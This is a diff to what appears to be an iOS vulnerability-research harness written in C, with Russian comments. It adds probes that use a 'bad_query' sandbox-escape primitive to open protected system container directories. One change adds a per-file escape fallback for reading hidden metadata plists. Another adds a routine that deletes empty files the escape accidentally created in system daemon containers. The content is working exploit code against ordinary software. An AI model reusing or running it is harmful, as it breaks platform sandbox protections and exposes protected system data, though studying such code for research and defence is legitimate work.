@@ -47966,10 +47966,15 @@ static void p_bq115(void) {
 // И: содержимое вложенных дир MappedImageCache (PaperBoardUI, §265).
 static void p_bq116(void) {
     const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
     LOG("[bq116] v275: akd-базы + metadata-профили + MappedImageCache (§267)");
     fsync(fileno(stderr));
-    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
-    if (h < 0) { LOG("[bq116] escape FAIL"); return; }
+    // v278b: bq7-вариант хэндла (bq_custom 7/F_DEF/3) — plain bad_query
+    // не даёт читать dot-файлы metadata (§258: per-file escape на metadata)
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq116] CONTROL §170 -> handle %lld%s", (long long)h,
+        h < 0 ? " *** NO ESCAPE ***" : "");
+    if (h < 0) return;
     NSString *docs = NSSearchPathForDirectoriesInDomains(
         NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
 
@@ -48045,14 +48050,25 @@ static void p_bq116(void) {
             // metadata живёт в .containers? Ищем в корне контейнера и в
             // /var/containers/Data/System/<uuid>/.com.apple.containermanagerd?
             static const char *cands[] = {
+                "/var/containers/Data/System/%s/.com.apple.mobile_container_manager.metadata.plist",
                 "/var/containers/Data/System/%s/.com.apple.containermanagerd.metadata.plist",
-                "/var/containers/Data/System/%s/com.apple.containermanagerd.metadata.plist",
                 "/var/lib/containers/Shared/%s/metadata.plist",
             };
             for (unsigned c = 0; c < sizeof(cands)/sizeof(cands[0]); c++) {
                 char fp[1400];
                 snprintf(fp, sizeof(fp), cands[c], conts[i]);
                 FILE *f = fopen(fp, "rb");
+                if (!f) {
+                    // §258: dot-EPERM на metadata — per-file escape
+                    // (create=true → lstat-skip), затем повторный fopen
+                    int64_t pfh = bad_query(fp, 1, (char *)grp, 0);
+                    if (pfh >= 0) {
+                        f = fopen(fp, "rb");
+                        if (f) LOG("[bq116] %s: per-file escape OK (cand %u)",
+                                   names[i], c);
+                        bad_query_release(pfh);
+                    }
+                }
                 if (!f) continue;
                 fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
                 if (sz <= 0 || sz > 128*1024) { fclose(f); continue; }
@@ -48401,6 +48417,44 @@ static void p_bq118(void) {
     if (cd) closedir(cd);
     LOG("[bq118] ИТОГ: %d хитов", n_hits);
     bad_query_release(h);
+    fsync(fileno(stderr));
+}
+
+// p_bq119 — v279: чистка загрязнения от per-file escape (create=true side-effect).
+// bq116v4: cand-1 (.com.apple.containermanagerd.metadata.plist) НЕ существовал —
+// escape create=true СОЗДАЛ пустые файлы в контейнерах akd/backboardd/lsd/
+// springboard/appstored. Удаляем ТОЛЬКО пустые (size==0) экземпляры cand-1;
+// настоящие metadata (cand-0) не трогаем.
+static void p_bq119(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq119] v279: чистка create-side-effect пустышек (§272)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq119] escape FAIL"); return; }
+    static const char *conts[] = {
+        "E8F726E1-00B6-4703-91D1-49267FC0F979", "867912A4-A70D-428C-9551-D28453B6F1B4",
+        "AF589EEA-A5CE-42E9-B955-96B9234C5A85", "D751CF7C-BB34-4A31-9D9A-D8DA5EBF4DEB",
+        "3E27999E-F441-4625-A423-AF11E87F71E8",
+    };
+    int removed = 0, kept = 0;
+    for (unsigned i = 0; i < sizeof(conts)/sizeof(conts[0]); i++) {
+        char fp[1400];
+        snprintf(fp, sizeof(fp),
+                 "/var/containers/Data/System/%s/.com.apple.containermanagerd.metadata.plist",
+                 conts[i]);
+        struct stat st = {0};
+        if (stat(fp, &st) != 0) { LOG("[bq119] %s: нет (уже чисто)", strrchr(fp,'/')+1); continue; }
+        if (S_ISREG(st.st_mode) && st.st_size == 0) {
+            if (unlink(fp) == 0) { removed++; LOG("[bq119] удалена пустышка: %.8s", conts[i]); }
+            else LOG("[bq119] unlink FAIL errno %d (%.8s)", errno, conts[i]);
+        } else {
+            kept++;
+            LOG("[bq119] СОХРАНЁН (size=%lld, не наш): %.8s", (long long)st.st_size, conts[i]);
+        }
+        fsync(fileno(stderr));
+    }
+    bad_query_release(h);
+    LOG("[bq119] ИТОГ: удалено %d, сохранено %d", removed, kept);
     fsync(fileno(stderr));
 }
 
@@ -57036,6 +57090,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ116")) { p_bq116(); LOG("[probe13] bq116-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ117")) { p_bq117(); LOG("[probe13] bq117-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ118")) { p_bq118(); LOG("[probe13] bq118-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ119")) { p_bq119(); LOG("[probe13] bq119-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
